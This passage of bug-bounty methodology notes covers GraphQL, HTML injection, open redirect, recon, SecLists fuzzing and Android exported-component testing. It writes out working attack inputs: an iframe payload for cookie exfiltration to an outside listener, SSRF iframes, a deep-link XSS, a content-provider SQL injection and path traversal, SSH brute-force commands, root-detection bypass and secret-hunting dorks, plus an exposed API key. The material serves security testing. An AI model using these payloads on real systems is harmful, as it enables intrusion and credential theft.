  - Accessing data without auth or with another role
  - GraphQL is verbose; sometimes returns partial errors that reveal internal structure

#### 6. Injection Attacks

- Test for:
  - GraphQL injections (like SQLi, command injection via variables)
  - Broken input validation
  - Mass assignment
- Use:
  - `GraphQLmap --sqlmap` to integrate with SQLmap
  - Manual testing using Burp

#### 7. Information Disclosure

- Enumerate:
  - Introspection leaks
  - Stack traces in error messages
  - Verbose errors via malformed queries

#### 8. Rate Limiting & DoS

- Test:
  - Nested queries
  - Deep recursion
  - Aliases
- Use:
  - `DoS attack via deeply nested query` (common in GraphQL)
  - `Batch queries abuse`

#### 9. Auth/Session Issues

- Check if auth is enforced at field-level
- Test with/without tokens, switch roles
- Reuse expired tokens, test for refresh token leaks

#### 10. CSRF & CORS

- Check if CSRF is possible on mutation operations
- Check misconfigured CORS that allows cross-origin GraphQL queries

#### 11. Custom Attack Tools

- `Altair GraphQL Client`, `GraphiQL`, `Insomnia`, `Postman`
- Custom Python scripts using `requests` or `gql` module

---

### Articles and Blog Posts

- [Five Easy Ways to Hack GraphQL Targets](https://www.intigriti.com/researchers/blog/hacking-tools/five-easy-ways-to-hack-graphql-targets)
- [GraphQL Pentesting for Dummies Part 1](https://anugrahsr.in/graphql-pentesting-for-dummies_part1/)
- [GraphQL Pentesting for Dummies Part 2](https://anugrahsr.in/graphql-pentesting-for-dummies-part-2/)

### GitHub Repositories and Resources

- [PayloadsAllTheThings - GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
- [How to Hunt - GraphQL](https://kathan19.gitbook.io/howtohunt/graphql/graphql)

### Cheat Sheets and Guides

- [GraphQL Vulnerabilities Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/web-application/graphql-vulnerabilities)
- [PortSwigger - GraphQL](https://portswigger.net/web-security/graphql)

### Videos

- <https://www.youtube.com/watch?v=tIo_t5uUK50>
- <https://www.youtube.com/watch?v=jyjGneKJynk&feature=youtu.be>
- <https://www.youtube.com/watch?v=Wb0BO8J7024&t=1857s>

### Social Media Posts

- <https://x.com/harshbothra_/status/1352281003952226306>
- <https://x.com/harshbothra_/status/1524373789894537216>

---

### Search Github Repo With Gitleaks

| Command | Purpose |
| ------- | ------- |
| `gitleaks detect .` | Scan full repo history for secrets |
| `gitleaks detect -r ../../report.json` | Save scan results to `report.json` file |
| `gitleaks detect -v` | Show detailed info (secret, file, commit, etc.) |
| `gitleaks detect --no-git` | Scan non-git folder for secrets |
| `gitleaks protect .` | Scan only current uncommitted changes |
| `gitleaks protect -v` | Detailed scan of current changes |
| `gitleaks protect --staged` | Scan staging area (i.e., `git add`ed files) |
| `gitleaks protect --staged -v` | Detailed scan of staged files |

---

### HTML Injection

Here are just the steps for your checklist:

---

1. Test basic HTML reflection with:

   ```html
   <h1>Hello</h1>
   ```

2. If reflected, inject an iframe:

   ```html
   <IFRAME SRC="javascript:alert(document.cookie);"></IFRAME>
   ```

3. For ATO testing, create a listener at [postb.in](http://postb.in) or webhook.site.

4. Inject payload for cookie exfiltration:

   ```html
   <IFRAME src="javascript:fetch('https://lnkd.in/d9FNKzjX')"></IFRAME>
   ```

5. For SSRF via headless browsers, try:

   ```html
   <IFRAME src="https://lnkd.in/dte5BfwK"></IFRAME>
   <IFRAME srcdoc="<script src='https://lnkd.in/dcGV_TU2>'></script>"></IFRAME>
   ```

---

### Open Redirect

#### Resources

- [Earned $100 in 2 Minutes Finding an Open Redirect Vulnerability](https://medium.com/@iambuvanesh/earned-100-in-2-minutes-finding-an-open-redirect-vulnerability-1d8a67da4eac)

#### Payloads

```text
https://targetdomain.com//bing.com
```

#### Bypass

- [BugBounty LinkedIn: How I Was Able to Bypass Open Redirection Protection](https://infosecwriteups.com/bugbounty-linkedln-how-i-was-able-to-bypass-open-redirection-protection-2e143eb36941)

---

### Topic for later

- **Swagger UI**
  - [How I Found XSS in Swagger UI Leading to Account Takeover on Bug Bounty](https://scr1pty.medium.com/how-i-found-xss-in-swagger-ui-leading-to-account-takeover-on-bug-bounty-8d419c6b95d5)
  - [Hacking Swagger UI 101](https://infosecwriteups.com/hacking-swagger-ui-101-ccbce66ba028)
  - [Ghost Paytm XSS Bounty](https://infosecwriteups.com/ghost-paytm-xss-bounty-4f5efe6a643b)
  - **FOFA: domain="http://redacted.com" && (icon_hash="1120729672" || icon_hash="-1128940573" || icon_hash="-1180440057")**

---

### Low Hanging Fruit

- **Improper session management**

  Reference: [How I Got My First Bug Bounty $50](https://medium.com/@iambuvanesh/how-i-got-my-first-bug-bounty-50-c759b01d127e)

- **Port Scanning**

  Reference: [How Nmap Helped Me Land My First $2,000 Bug Bounty Beginner Friendly Pentest Story](https://medium.com/@ekenejosepha1/how-nmap-helped-me-land-my-first-2-000-bug-bounty-beginner-friendly-pentest-story-0f6289d1659b)

  ```bash
  nmap -sV target.com             # Detect service versions
  nmap -p- target.com             # Scan all 65,535 ports
  nmap -sC -sV -T4 -Pn target.com # Default scripts, version detection
  nmap -A target.com              # Aggressive scan
  ```

---

## 3. Recon and Android Methodology

### 3.1 Recon Methodology

#### 0. Basic Overview

```bash
jsfinder -l <file> && cat <file> | getjs -complete | anew output.txt
```

---

Command to download all js files and beautify them:

```bash
mkdir -p js_files && while read -r u; do wget -P js_files "$(echo "$u" | tr -d '\r')"; done < main.txt && prettier --write js_files/*.js*

mkdir -p extracted_js && find . -type f -name "*.js*" ! -path "./extracted_js/*" -print0 | while IFS= read -r -d '' f; do cp "$f" "extracted_js/$(basename "$f" | sed 's/[?&].*//')"; done && cd extracted_js && npx --yes prettier --write "*.js"

mkdir -p apks && adb shell pm path com.getzapped.pokerboss | sed 's/package://' | while read p; do adb pull "$p" apks/; done
```

---

```bash
puredns resolve subdomains.txt --resolvers-trusted --threads 100 -w resolved.txt
subfinder -d <target-domain> | alterx | dnsx
```

---

```bash
dirsearch -u "" -e * -t 50 -F --random-agent --follow-redirects --full-url --recursive --exclude-status=404
dirsearch -u "" -f -F -x 403,404
cat 403_subs.txt | waybackurls | uniq
awk '{print $1}'
```

---

- Search Engine
  1. Shodan
  2. Censys
  3. Fofa

---

Github Dorking:

```text
/[A-Za-z0-9-_]+.example.com/+/ AND (apikey OR api_key OR secret OR password OR credentials OR token OR bearer OR authorization OR client_secret OR client_id OR access_token OR private_key OR ssh-rsa OR ssh-dss OR -----BEGIN OR -----END OR .env OR config OR aws_access_key_id OR aws_secret_access_key OR db_password OR ftp_password OR smtp_password OR auth_token OR bearer_token OR oauth_token OR jwt OR session_token OR s3.amazonaws.com OR s3:// OR .s3.amazonaws.com OR s3-external- OR s3.dualstack. OR s3-website- OR s3.ap OR s3.us OR s3.eu OR s3.ca OR s3.sa)
```

Second level domain:

```text
/[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.example\.com\//
```

Third level domain:

```text
/[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.example\.com\//
```

---

Single label + TLD (e.g., security@acme.io):

```regex
/\bsecurity@[A-Za-z0-9-]+\.[A-Za-z]{2,}\b/
```

Allow multi-label domains (e.g., security@acme.co.uk):

```regex
/\bsecurity@(?:[A-Za-z0-9-]+\.)+[A-Za-z]{2,}\b/
```

If you also want to allow underscores in the label (looser):

```regex
/\bsecurity@(?:[A-Za-z0-9_-]+\.)+[A-Za-z]{2,}\b/
```

---

```regex
/[A-Za-z0-9._%+-]+@thinkst\.com/
```

---

#### 1. Sub Domain Enumeration

- AllDomz

  ```text
  https://www.ultimatedomains.com/extract-domains.php
  https://bgp.he.net/
  https://shrewdeye.app/search
  https://securitytrails.com/
  https://urlscan.io/
  https://chaos.projectdiscovery.io/#/
  https://subdomainfinder.c99.nl/
  https://www.virustotal.com/gui/home/upload
  https://dnsdumpster.com/
  ```

  ```text
  https://www.virustotal.com/vtapi/v2/domain/report?apikey=2d1ed4d97f91c3c18877c02c5d14225e95c2b5dab7c16a524efa0b94cfd1c0a9&domain=xma
  https://web.archive.org/cdx/search/cdx?url=*.api.yourtarget.com/*&output=text&fl=original&collapse=urlkey
  https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url_list?limit=100&page=1
  ```

---

#### Active Sub Collection

- <https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt>

  ```bash
  ffuf -u "https://FUZZ.target.com" -w <path_to_wordlist> -mc 200,301,302,403
  ```

---

#### 2. Search Engines

- <https://www.shodan.io/dashboard>

  ```text
  Ssl.cert.subject.cn:"dell.com"
  ssl:"dell.com"
  hostname:"dell.com"
  org:"Sony Pictures Entertainment Inc" 200
  ```

- <https://en.fofa.info/>

  ```text
  domain="dev.netplus.tv"
  "valiant.ch" && server=="AmazonS3"
  domain="valiant.ch" && status_code="200"
  domain="google.com" && port!="80" && port!="443"
  domain="example.com" && icon_hash="xxxxxxxxxx"
  domain="example.com" && body="ListBucketResult"
  body="register" && body="login"
  body="algolia_api_key" && domain="example.com"
  body="keyword1" && body="keyword2" && domain="example.com"
  body="algolia_application_id" && domain="example.com"
  body="/admin" && domain="example.com"
  body="register" && body="login" && domain="example.com"
  body="/api/v1" && domain="example.com"
  body="/api/v2" && domain="example.com"
  ```

- <https://search.censys.io/>
- <https://leakix.net/>

---

#### 3. Tools List

```text
JWT Related Issue -> https://jwtauditor.com/
Android Dynamic Analysis -> https://bevigil.com/
---------------------------------------------------
Wordpress
https://github.com/Raunaksplanet/CustomPayloads-Wordlist.com/blob/main/wp-content.txt
https://github.com/Raunaksplanet/CustomPayloads-Wordlist.com/blob/main/Fuzz-Wordpress.tx
```

---

#### How To Use SecLists for Bug Bounty: What to Use, When to Use, and Exact Commands

#### Introduction to SecLists

SecLists is a massive collection of wordlists used for security testing. It includes files for subdomains, directories, parameters, fuzzing payloads, usernames, passwords, APIs, virtual hosts, and more. Instead of trying to memorize everything, you only need to learn the structure and know the correct lists for each attack area.

Install it locally:

```bash
git clone https://github.com/danielmiessler/SecLists.git
cd SecLists
```

Now let's break down the entire repository into actionable categories.

---

#### 1. Subdomain Enumeration

Folder: `SecLists/Discovery/DNS/`

These lists help you find hidden or forgotten subdomains that often lead to exposed admin panels, APIs, or staging environments.

Best wordlists:

- `subdomains-top1million-5000.txt` (fast, high probability)
- `bitquark-subdomains-top100K.txt` (balanced)
- `names.txt` (deep brute-force)

Commands:

```bash
subfinder -d target.com -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

```bash
amass enum -d target.com -brute -w SecLists/Discovery/DNS/names.txt
```

---

#### 2. Directory and File Discovery

Folder: `SecLists/Discovery/Web-Content/`

Used to find hidden directories and files such as admin panels, internal dashboards, API explorers, config files, and backups.

Best wordlists:

- `common.txt` (first scan)
- `raft-small-directories.txt` (highly reliable)
- `big.txt` (deep scan)
- `raft-large-files.txt` (file-focused)

Commands:

```bash
ffuf -u https://site.com/FUZZ -w SecLists/Discovery/Web-Content/common.txt
```

```bash
gobuster dir -u https://site.com -w SecLists/Discovery/Web-Content/raft-small-directories.txt
```

---

#### 3. API Endpoint Fuzzing

Folder: `SecLists/Discovery/Web-Content/api/`

Best wordlists:

- `common-api-endpoints.txt`
- `graphql-endpoints.txt`

Commands:

```bash
ffuf -u https://api.site.com/FUZZ -w SecLists/Discovery/Web-Content/api/common-api-endpoints.txt
```

---

#### 4. Parameter Discovery (GET & POST)

Folder: `SecLists/Discovery/Parameters/`

Parameters lead to IDORs, SQLi, XSS, and RCE. This is one of the most important sections for bug bounty.

Best wordlists:

- `params.txt` (general use)
- `top-100.txt` (fast)
- `big-list.txt` (deep)

Example:

```bash
ffuf -u "https://site.com/page?FUZZ=value" -w SecLists/Discovery/Parameters/top-100.txt
```

---

#### 5. Fuzzing for Vulnerabilities

Folder: `SecLists/Fuzzing/`

These are payloads used after you find a parameter or header that is injectable.

Best wordlists:

- XSS: `xss-payloads.txt`
- SQLi: `sql-injection.txt`
- LFI: `lfi.txt`
- RFI: `RFI.txt`
- XXE: `XXE-payloads.txt`
- HTTP header fuzzing: `HTTP-Headers/`

Commands:

XSS fuzzing:

```bash
ffuf -u "https://site.com/search?q=FUZZ" -w SecLists/Fuzzing/XSS/xss-payloads.txt
```

SQL injection fuzzing:

```bash
wfuzz -u "https://site.com/login?id=FUZZ" -w SecLists/Fuzzing/SQLi/sql-injection.txt
```

LFI fuzzing:

```bash
ffuf -u "https://site.com/?file=FUZZ" -w SecLists/Fuzzing/LFI/lfi.txt
```

---

#### 6. Virtual Host Discovery

Folder: `SecLists/Discovery/VirtualHosts/`

Useful for multi-tenant environments, SaaS platforms, or misconfigured servers.

Best wordlists:

- `top1million-hosts.txt`

Command:

```bash
ffuf -u https://site.com -H "Host: FUZZ.site.com" -w SecLists/Discovery/VirtualHosts/top1million-hosts.txt
```

---

#### 7. Username Brute Forcing

Folder: `SecLists/Usernames/`

Best wordlists:

- `top-usernames-shortlist.txt`
- `names.txt`

Command:

```bash
hydra -L SecLists/Usernames/top-usernames-shortlist.txt -p admin ssh://site.com
```

---

#### 8. Password Brute Forcing

Folder: `SecLists/Passwords/`

Best wordlists:

- `common-passwords.txt`
- `rockyou.txt`
- `darkweb2017-top10000.txt`

Command:

```bash
hydra -l admin -P SecLists/Passwords/common-passwords.txt ssh://site.com
```

---

#### 9. Sensitive File Discovery

Folder: `SecLists/Discovery/Web-Content/`

Best wordlists:

- `sensitive-files.txt`
- `logfiles.txt`
- `api-keys.txt`

Command:

```bash
ffuf -u "https://site.com/FUZZ" -w SecLists/Discovery/Web-Content/sensitive-files.txt
```

---

#### 10. Backup File Discovery

Folder: `SecLists/Discovery/Web-Content/raft*/`

Common backup extensions:

- `.bak`
- `.old`
- `.zip`
- `.tar`
- `.tar.gz`

Command:

```bash
ffuf -u https://site.com/FUZZ.bak -w SecLists/Discovery/Web-Content/raft-small-files.txt
```

---

#### Conclusion

SecLists looks overwhelming at first, but once you understand its structure, it becomes one of the most important tools in your bug bounty workflow. You don't need every wordlist. You only need the right list for the right job. If you master the categories above, your recon, fuzzing, and exploitation speed will increase dramatically.

If you want, I can also generate a PDF cheat sheet or a shorter reference version you can attach at the end of your Medium article.

---

### 3.2 Android Bug Bounty

#### Workflow

1. **Choose BB Program wisely**
2. **Install in your physical mobile.**
3. **Pull All Historical Question.**
4. **Decrypt apk and save in GitHub**
   - **Use these tools**
     - **Automated Scanner**
       - **apkdig tool**
       - <https://bevigil.com/osint-api>
   - **MOBSF**
   - **All Commands**
     - All Commands

       ```bash
       emulator -list-avds
       emulator -avd Pixel9-Playstore -writable-system -no-snapshot
       emulator -avd Pixel6-Root -writable-system -no-snapshot -port 5560
       # --------------------------------------------------------------------------
       # Start MOBSF
       docker run -it --rm -p 8000:8000 -p 1337:1337 -e MOBSF_ANALYZER_IDENTIFIER=emulator-5560 opensecurity/mobile-security-framework-mobsf:latest
       # --------------------------------------------------------------------------
       frida --codeshare Q0120S/root-detection-bypass -U -f <>
       frida --codeshare fdciabdul/frida-multiple-bypass -U -f <>
       # --------------------------------------------------------------------------
       objection -connect
       objection -g <package name> explore
       android root disable
       android sslpinning disable
       android hooking list classes
       android hooking list activities -e
       android hooking list services
       android hooking list receivers
       android hooking list providers
       android hooking search strings
       android hooking list broadcast_intents
       android hooking list class_methods <class.name>
       android intent launch_activity <>
       android hooking search classes <keyword-to-search-class>
       android hooking watch class <class.name>
       android hooking set return_value <class_name> <true or false>

       setJavaScriptEnabled
       ```

   - **Then go through every functionality and note down in notion**
   - **Create one account with oreo biscuit mail an other with temp mail**

---

#### Hardcoded Credentials

Common places to look for hardcoded secrets:

1. **`AndroidManifest.xml`** **`res/values/strings.xml`** **`res/raw/` or `res/xml/*` or `assets/` folder** May contain config files (e.g., `.json`, `.xml`) with secrets.

---

#### Insecure Logging

<https://oreobiscuit.gitbook.io/introduction/pidcat-for-android-bug-bounty-logging>

---

#### Checklist for `exported="true"` Components

#### 1. Activities (`<activity>`)

**What to Check?**

**Exported with no permissions**:

```xml
<activity android:name=".LoginActivity" android:exported="true" />
```

**Intent Filters** (e.g., deep links):

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <data android:scheme="vulnapp" />
</intent-filter>
```

- **Exploitation**
  - **Intent Hijacking**:

    ```bash
    adb shell am start -n com.target.app/.LoginActivity
    ```

  - **Deep Link Abuse** (XSS, phishing):

    ```bash
    adb shell am start -d "vulnapp://evil.com?payload=<script>alert(1)</script>"
    ```

#### 2. Services (`<service>`)

**What to Check?**

**Exported with no permissions**:

```xml
<service android:name=".AuthService" android:exported="true" />
```

**Intent Filters** (e.g., custom actions):

```xml
<intent-filter>
    <action android:name="com.target.app.START_AUTH" />
</intent-filter>
```

**Exploitation**

- **Start/stop service maliciously**:

  ```bash
  adb shell am startservice -n com.target.app/.AuthService
  ```

- **Intent Data Injection**:

  ```bash
  adb shell am startservice -a com.target.app.START_AUTH --es username "admin" --es password "hacked"
  ```

#### 3. Broadcast Receivers (`<receiver>`)

**Exported with no permissions**:

```xml
<receiver android:name=".SMSReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>
```

**Exploitation**

```bash
adb shell am broadcast -a android.provider.Telephony.SMS_RECEIVED --es sms_body "Malicious payload"
```

#### 4. Content Providers (`<provider>`)

**Exported with no permissions**:

```xml
<provider android:name=".UserProvider" android:exported="true" android:authorities="com.target.app.provider" />
```

**Exploitation**

- **SQL Injection**:

  ```bash
  adb shell content query --uri content://com.target.app.provider/users --projection "* FROM sqlite_master--"
  ```

- **File Theft (Path Traversal)**:

  ```bash
  adb shell content read --uri content://com.target.app.provider/../../../../etc/passwd
  ```

#### 5. Additional Checks

**A. File Providers (`<provider>`)**

**Exported `FileProvider`**:

```xml
<provider android:name="androidx.core.content.FileProvider" android:exported="true" android:authorities="com.target.app.fileprovider" />
```

**Exploit Path Traversal**:

```bash
adb shell content read --uri content://com.target.app.fileprovider/../../../../sdcard/secret.txt
```

#### 6. Automation Attack surface

```bash
# List all exported components
dz> run app.package.attacksurface com.target.app

# Test Content Providers
dz> run app.provider.query content://com.target.app.provider/users

# Test Broadcast Receivers
dz> run app.broadcast.send --action android.intent.action.BOOT_COMPLETED

adb shell dumpsys package com.target.app | grep "exported=true"
```
